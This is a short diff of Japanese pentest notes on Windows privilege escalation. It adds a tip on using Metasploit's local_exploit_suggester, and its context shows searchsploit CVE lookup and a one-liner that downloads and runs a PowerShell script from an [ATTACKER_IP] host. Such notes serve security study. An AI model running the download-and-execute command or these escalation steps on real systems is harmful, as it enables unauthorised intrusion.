@@ -496,6 +496,8 @@ IEX (Invoke-WebRequest -Uri "http://[ATTACKER_IP]:8888/exploit.ps1" -UseBasicPar
 
 ### CVE の調べ方（PoC を探す前に）
 
+> **Metasploit セッションがあるなら**、まず `local_exploit_suggester` でローカル昇格候補を自動列挙すると速い（`sysinfo` で arch を確認 → x86 は判定が比較的信頼できる）。使い方・local exploit モジュールの実行・書込可能 cwd の罠 → `../05_Tools_Reference/Metasploit.md`（§7）。
+
 ```bash
 # [Attacker] バージョン情報からCVEを検索
 searchsploit windows server [年]
